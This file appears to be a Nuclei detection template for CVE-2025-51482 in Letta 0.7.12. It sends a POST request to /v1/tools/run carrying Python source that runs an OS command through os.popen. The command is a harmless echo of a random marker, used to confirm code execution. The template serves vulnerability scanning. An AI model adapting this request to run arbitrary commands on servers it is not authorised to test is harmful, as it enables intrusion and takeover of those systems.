id: letta-tools-run-rce
info:
  name: Letta Letta 0.7.12 - Remote Code Execution
  author: RaghavArora14
  severity: high
  description: |
    Letta 0.7.12 is vulnerable to remote code execution via POST /v1/tools/run in
    letta.server.rest_api.routers.v1.tools.run_tool_from_source, allowing attackers to execute
    arbitrary Python and OS commands via crafted tool source code.
  reference:
    - https://www.gecko.security/blog/cve-2025-51482
    - https://github.com/letta-ai/letta/pull/2630
    - https://github.com/Kai-One001/Letta-CVE-2025-51482-RCE
    - https://nvd.nist.gov/vuln/detail/CVE-2025-51482
  classification:
    cve-id: CVE-2025-51482
    cwe-id: CWE-94
    cvss-score: 8.8
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  metadata:
    vendor: Letta-ai
    product: Letta
    affected-component: /v1/tools/run
    tags: cve, rce, python, ai, letta
    verified: true
    nuclei-type: http
    max-request: 1

variables:
  cmd: "{{randstr}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/v1/tools/run"

    headers:
      Content-Type: application/json


    # Executes a harmless echo with a random marker to confirm code execution.
    body: |
      {
        "name": "nuclei",
        "args": {},
        "json_schema": {"type": "object", "properties": {}},
        "source_code": "def nuclei():\n    import os\n    return os.popen('echo {{cmd}}').read()"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      # Ensure we see the exact randomized marker returned by command execution.
      - type: word
        part: body
        words:
          - "{{cmd}}"

      # Require JSON content-type to reduce false positives.
      - type: word
        part: header
        words:
          - "application/json"

    extractors:
      - type: kval
        part: header
        kval:
          - Content-Type
